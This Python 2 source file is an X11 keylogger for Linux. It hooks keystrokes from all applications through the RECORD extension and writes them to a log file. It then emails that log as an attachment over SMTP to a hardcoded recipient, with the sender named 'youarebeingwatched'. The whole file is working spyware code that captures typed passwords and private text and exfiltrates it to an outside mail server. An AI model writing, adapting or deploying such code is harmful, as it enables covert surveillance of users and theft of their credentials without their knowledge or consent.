# -*- coding: utf-8 -*-

import time
import smtplib
import getpass
import os.path as op
import sys
import os
import re
import threading

from Xlib import X, XK, display, error
from Xlib.ext import record
from Xlib.protocol import rq
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders

LOG_FILE='/home/user/Documents/kl.log'
SEND_FROM='smile@youarebeingwatched.com'
SEND_TO='lerolero@nope.com'
SERVER='smtp.mailtrap.io'
USERNAME='nope'
PASSWD='nope'
PORT=2525

def main():
    main_subject = ('log from: ' + getpass.getuser() + ' at: ' + time.strftime("%d/%m/%Y %H:%M:%S"))
    main_msg = 'thats all folks.'
    sendMail(SEND_FROM, SEND_TO, main_subject, main_msg, SERVER, PORT, USERNAME, PASSWD, True)

    fob=open(LOG_FILE,'a')
    fob.write('\n')
    fob.write('day: ' + time.strftime("%d/%m/%Y %H:%M:%S") + '\n')
    separator = ('**************************************************')
    line = separator
    fob.write(line)
    fob.write('\n')
    fob.close()

    new_hook=HookManager()
    new_hook.KeyDown=OnKeyPress
    new_hook.HookKeyboard()
    new_hook.start()

def sendMail(send_from, send_to, subject, message, 
             server, port, username, password,
              use_tls):

    msg = MIMEMultipart()
    msg['From'] = send_from
    msg['To'] = send_to
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach(MIMEText(message))

    part = MIMEBase('application', "octet-stream")
    with open(LOG_FILE, 'rb') as file:
        part.set_payload(file.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 
                        'attachment; filename="{}"'.format(op.basename(LOG_FILE)))
    msg.attach(part)

    smtp = smtplib.SMTP(server, port)
    if use_tls:
        smtp.starttls()
    smtp.login(username, password)
    smtp.sendmail(send_from, send_to, msg.as_string())
    smtp.quit()

def OnKeyPress(event):
    with open(LOG_FILE, 'a+') as fob:
        if event.Ascii==96: #96 é o valor ascii para (`)
            fob.close()
            new_hook.cancel()

        lines = fob.read().splitlines()
        last_line = lines[-1]

        if len(last_line) >= 50:
            fob.write('\n')

        fob.write(event.Key)    

#######################################################################
########################START CLASS DEF################################
#######################################################################

class HookManager(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.finished = threading.Event()

        self.mouse_position_x = 0
        self.mouse_position_y = 0
        self.ison = {"shift":False, "caps":False}

        self.isshift = re.compile('^Shift')
        self.iscaps = re.compile('^Caps_Lock')
        self.shiftablechar = re.compile('^[a-z0-9]$|^minus$|^equal$|^bracketleft$|^bracketright$|^semicolon$|^backslash$|^apostrophe$|^comma$|^period$|^slash$|^grave$')
        self.logrelease = re.compile('.*')
        self.isspace = re.compile('^space$')

        self.KeyDown = lambda x: True
        self.KeyUp = lambda x: True
        self.MouseAllButtonsDown = lambda x: True
        self.MouseAllButtonsUp = lambda x: True

        self.contextEventMask = [X.KeyPress,X.MotionNotify]

        self.local_dpy = display.Display()
        self.record_dpy = display.Display()

    def run(self):
        if not self.record_dpy.has_extension("RECORD"):
            print "RECORD extension not found"
            sys.exit(1)
        r = self.record_dpy.record_get_version(0, 0)
        print "RECORD extension version %d.%d" % (r.major_version, r.minor_version)

        self.ctx = self.record_dpy.record_create_context(
                    0,
                [record.AllClients],
                [{
                    'core_requests': (0, 0),
                        'core_replies': (0, 0),
                        'ext_requests': (0, 0, 0, 0),
                        'ext_replies': (0, 0, 0, 0),
                        'delivered_events': (0, 0),
                        'device_events': tuple(self.contextEventMask), #(X.KeyPress, X.ButtonPress),
                        'errors': (0, 0),
                        'client_started': False,
                        'client_died': False,
                }])

        self.record_dpy.record_enable_context(self.ctx, self.processevents)
        self.record_dpy.record_free_context(self.ctx)

    def cancel(self):
        self.finished.set()
        self.local_dpy.record_disable_context(self.ctx)
        self.local_dpy.flush()

    def printevent(self, event):
        print event

    def HookKeyboard(self):
        pass

    def HookMouse(self):
        pass

    def processevents(self, reply):
        if reply.category != record.FromServer:
            return
        if reply.client_swapped:
            print "* received swapped protocol data, cowardly ignored"
            return
        if not len(reply.data) or ord(reply.data[0]) < 2:
            return
        data = reply.data
        while len(data):
            event, data = rq.EventField(None).parse_binary_value(data, self.record_dpy.display, None, None)
            if event.type == X.KeyPress:
                hookevent = self.keypressevent(event)
                self.KeyDown(hookevent)
            elif event.type == X.KeyRelease:
                hookevent = self.keyreleaseevent(event)
                self.KeyUp(hookevent)
            elif event.type == X.ButtonPress:
                hookevent = self.buttonpressevent(event)
                self.MouseAllButtonsDown(hookevent)
            elif event.type == X.ButtonRelease:
                hookevent = self.buttonreleaseevent(event)
                self.MouseAllButtonsUp(hookevent)
            elif event.type == X.MotionNotify:
                self.mousemoveevent(event)

        #print "processing events...", event.type

    def keypressevent(self, event):
        matchto = self.lookup_keysym(self.local_dpy.keycode_to_keysym(event.detail, 0))
        if self.shiftablechar.match(self.lookup_keysym(self.local_dpy.keycode_to_keysym(event.detail, 0))): ## This is a character that can be typed.
            if self.ison["shift"] == False:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
                return self.makekeyhookevent(keysym, event)
            else:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 1)
                return self.makekeyhookevent(keysym, event)
        else: ## Not a typable character.
            keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
            if self.isshift.match(matchto):
                self.ison["shift"] = self.ison["shift"] + 1
            elif self.iscaps.match(matchto):
                if self.ison["caps"] == False:
                    self.ison["shift"] = self.ison["shift"] + 1
                    self.ison["caps"] = True
                if self.ison["caps"] == True:
                    self.ison["shift"] = self.ison["shift"] - 1
                    self.ison["caps"] = False
            return self.makekeyhookevent(keysym, event)

    def keyreleaseevent(self, event):
        if self.shiftablechar.match(self.lookup_keysym(self.local_dpy.keycode_to_keysym(event.detail, 0))):
            if self.ison["shift"] == False:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
            else:
                keysym = self.local_dpy.keycode_to_keysym(event.detail, 1)
        else:
            keysym = self.local_dpy.keycode_to_keysym(event.detail, 0)
        matchto = self.lookup_keysym(keysym)
        if self.isshift.match(matchto):
            self.ison["shift"] = self.ison["shift"] - 1
        return self.makekeyhookevent(keysym, event)

    def buttonpressevent(self, event):
        #self.clickx = self.rootx
        #self.clicky = self.rooty
        return self.makemousehookevent(event)

    def buttonreleaseevent(self, event):
        #if (self.clickx == self.rootx) and (self.clicky == self.rooty):
            ##print "ButtonClick " + str(event.detail) + " x=" + str(self.rootx) + " y=" + str(self.rooty)
            #if (event.detail == 1) or (event.detail == 2) or (event.detail == 3):
                #self.captureclick()
        #else:
            #pass

        return self.makemousehookevent(event)

        #    sys.stdout.write("ButtonDown " + str(event.detail) + " x=" + str(self.clickx) + " y=" + str(self.clicky) + "\n")
        #    sys.stdout.write("ButtonUp " + str(event.detail) + " x=" + str(self.rootx) + " y=" + str(self.rooty) + "\n")
        #sys.stdout.flush()

    def mousemoveevent(self, event):
        self.mouse_position_x = event.root_x
        self.mouse_position_y = event.root_y

    def lookup_keysym(self, keysym):
        for name in dir(XK):
            if name.startswith("XK_") and getattr(XK, name) == keysym:
                return name.lstrip("XK_")
        return "[%d]" % keysym

    def asciivalue(self, keysym):
        asciinum = XK.string_to_keysym(self.lookup_keysym(keysym))
        if asciinum < 256:
            return asciinum
        else:
            return 0

    def makekeyhookevent(self, keysym, event):
        storewm = self.xwindowinfo()
        if event.type == X.KeyPress:
            MessageName = "key down"
        elif event.type == X.KeyRelease:
            MessageName = "key up"
        return pyxhookkeyevent(storewm["handle"], storewm["name"], storewm["class"], self.lookup_keysym(keysym), self.asciivalue(keysym), False, event.detail, MessageName)

    def makemousehookevent(self, event):
        storewm = self.xwindowinfo()
        if event.detail == 1:
            MessageName = "mouse left "
        elif event.detail == 3:
            MessageName = "mouse right "
        elif event.detail == 2:
            MessageName = "mouse middle "
        elif event.detail == 5:
            MessageName = "mouse wheel down "
        elif event.detail == 4:
            MessageName = "mouse wheel up "
        else:
            MessageName = "mouse " + str(event.detail) + " "

        if event.type == X.ButtonPress:
            MessageName = MessageName + "down"
        elif event.type == X.ButtonRelease:
            MessageName = MessageName + "up"
        return pyxhookmouseevent(storewm["handle"], storewm["name"], storewm["class"], (self.mouse_position_x, self.mouse_position_y), MessageName)

    def xwindowinfo(self):
        try:
            windowvar = self.local_dpy.get_input_focus().focus
            wmname = windowvar.get_wm_name()
            wmclass = windowvar.get_wm_class()
            wmhandle = str(windowvar)[20:30]
        except:
            ## This is to keep things running smoothly. It almost never happens, but still...
            return {"name":None, "class":None, "handle":None}
        if (wmname == None) and (wmclass == None):
            try:
                windowvar = windowvar.query_tree().parent
                wmname = windowvar.get_wm_name()
                wmclass = windowvar.get_wm_class()
                wmhandle = str(windowvar)[20:30]
            except:
                ## This is to keep things running smoothly. It almost never happens, but still...
                return {"name":None, "class":None, "handle":None}
        if wmclass == None:
            return {"name":wmname, "class":wmclass, "handle":wmhandle}
        else:
            return {"name":wmname, "class":wmclass[0], "handle":wmhandle}

class pyxhookkeyevent:

    def __init__(self, Window, WindowName, WindowProcName, Key, Ascii, KeyID, ScanCode, MessageName):
        self.Window = Window
        self.WindowName = WindowName
        self.WindowProcName = WindowProcName
        self.Key = Key
        self.Ascii = Ascii
        self.KeyID = KeyID
        self.ScanCode = ScanCode
        self.MessageName = MessageName

    def __str__(self):
        return "Window Handle: " + str(self.Window) + "\nWindow Name: " + str(self.WindowName) + "\nWindow's Process Name: " + str(self.WindowProcName) + "\nKey Pressed: " + str(self.Key) + "\nAscii Value: " + str(self.Ascii) + "\nKeyID: " + str(self.KeyID) + "\nScanCode: " + str(self.ScanCode) + "\nMessageName: " + str(self.MessageName) + "\n"

class pyxhookmouseevent:

    def __init__(self, Window, WindowName, WindowProcName, Position, MessageName):
        self.Window = Window
        self.WindowName = WindowName
        self.WindowProcName = WindowProcName
        self.Position = Position
        self.MessageName = MessageName

    def __str__(self):
        return "Window Handle: " + str(self.Window) + "\nWindow Name: " + str(self.WindowName) + "\nWindow's Process Name: " + str(self.WindowProcName) + "\nPosition: " + str(self.Position) + "\nMessageName: " + str(self.MessageName) + "\n"

#######################################################################
#########################END CLASS DEF#################################
#######################################################################

if __name__ == '__main__':
    main()
